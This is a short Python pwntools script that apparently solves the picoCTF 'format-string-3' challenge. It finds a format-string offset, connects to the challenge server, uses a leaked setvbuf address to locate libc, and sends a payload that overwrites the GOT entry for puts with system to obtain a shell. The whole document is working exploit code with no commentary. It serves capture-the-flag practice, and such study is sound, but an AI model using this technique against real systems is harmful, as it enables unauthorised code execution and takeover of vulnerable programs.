from pwn import *

elf = context.binary = ELF('./format-string-3')


def send_payload(payload):
    p = elf.process()
    p.sendline(payload)
    l = p.recvall()
    p.close()
    return l


offset = FmtStr(send_payload).offset
info("offset = %d", offset)

p = remote('rhea.picoctf.net', 64258)
# p = remote('rhea.picoctf.net', 50248)

p.recvuntil(b': 0x')
setvbuf_leak = int(p.recvuntil(b'\n', drop=True).decode(), 16)

libc = ELF("./libc.so.6")
libc.address = setvbuf_leak - libc.symbols['setvbuf']  # normalizing libc base address

sys_addr = libc.symbols['system']
puts_addr = elf.got['puts']
writes = {puts_addr: sys_addr}

payload = fmtstr_payload(offset, writes)
p.sendline(payload)
p.interactive()